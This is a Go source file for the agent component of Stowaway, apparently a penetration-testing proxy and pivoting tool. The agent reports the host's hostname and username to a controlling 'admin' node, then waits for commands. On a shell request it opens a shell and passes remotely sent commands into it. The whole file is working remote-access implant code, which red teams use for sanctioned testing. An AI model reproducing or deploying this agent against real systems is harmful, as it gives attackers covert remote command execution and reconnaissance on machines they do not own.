/*
 * @Author: ph4ntom
 * @Date: 2021-03-10 15:27:30
 * @LastEditors: ph4ntom
 * @LastEditTime: 2021-03-18 18:55:56
 */

package process

import (
	"Stowaway/agent/handler"
	"Stowaway/agent/initial"
	"Stowaway/crypto"
	"Stowaway/protocol"
	"Stowaway/utils"
	"log"
	"net"
)

type Agent struct {
	ID           string
	Conn         net.Conn
	Memo         string
	CryptoSecret []byte
	UserOptions  *initial.Options
}

func (agent *Agent) Prepare(options *initial.Options) {
	agent.ID = protocol.TEMP_UUID
	agent.CryptoSecret, _ = crypto.KeyPadding([]byte(options.Secret))
	agent.UserOptions = options
}

func (agent *Agent) Run() {
	agent.sendMyInfo()
	agent.handleDataFromUpstream()
	//agent.handleDataFromDownstream()
}

func (agent *Agent) sendMyInfo() {
	sMessage := protocol.PrepareAndDecideWhichSProto(agent.Conn, agent.UserOptions.Secret, agent.ID)
	header := protocol.Header{
		Sender:      agent.ID,
		Accepter:    protocol.ADMIN_UUID,
		MessageType: protocol.MYINFO,
		RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))), // No need to set route when agent send mess to admin
		Route:       protocol.TEMP_ROUTE,
	}

	hostname, username := utils.GetSystemInfo()

	myInfoMess := protocol.MyInfo{
		UsernameLen: uint64(len(username)),
		Username:    username,
		HostnameLen: uint64(len(hostname)),
		Hostname:    hostname,
	}

	protocol.ConstructMessage(sMessage, header, myInfoMess)
	sMessage.SendMessage()
}

func (agent *Agent) handleDataFromUpstream() {
	rMessage := protocol.PrepareAndDecideWhichRProto(agent.Conn, agent.UserOptions.Secret, agent.ID)
	sMessage := protocol.PrepareAndDecideWhichSProto(agent.Conn, agent.UserOptions.Secret, agent.ID)
	shell := handler.NewShell()

	for {
		fHeader, fMessage, err := protocol.DestructMessage(rMessage)
		if err != nil {
			log.Println("[*]Peer node seems offline!")
			break
		}
		switch fHeader.MessageType {
		case protocol.MYMEMO:
			message := fMessage.(*protocol.MyMemo)
			agent.Memo = message.Memo
		case protocol.SHELLREQ:
			// No need to check member "start"
			var shellResMess protocol.ShellRes
			header := protocol.Header{
				Sender:      agent.ID,
				Accepter:    protocol.ADMIN_UUID,
				MessageType: protocol.SHELLRES,
				RouteLen:    uint32(len([]byte(protocol.TEMP_ROUTE))), // No need to set route when agent send mess to admin
				Route:       protocol.TEMP_ROUTE,
			}
			if err := shell.Init(); err != nil {
				shellResMess = protocol.ShellRes{
					OK: 0,
				}
			} else {
				shellResMess = protocol.ShellRes{
					OK: 1,
				}
				go shell.Run(agent.Conn, agent.ID, agent.UserOptions.Secret)
			}
			protocol.ConstructMessage(sMessage, header, shellResMess)
			sMessage.SendMessage()
		case protocol.SHELLCOMMAND:
			message := fMessage.(*protocol.ShellCommand)
			shell.Input(message.Command)
		case protocol.LISTENREQ:
			//message := fMessage.(*protocol.ListenReq)
			//go handler.StartListen(message.Addr)
		default:
			log.Println("[*]Unknown Message!")
		}
	}
}
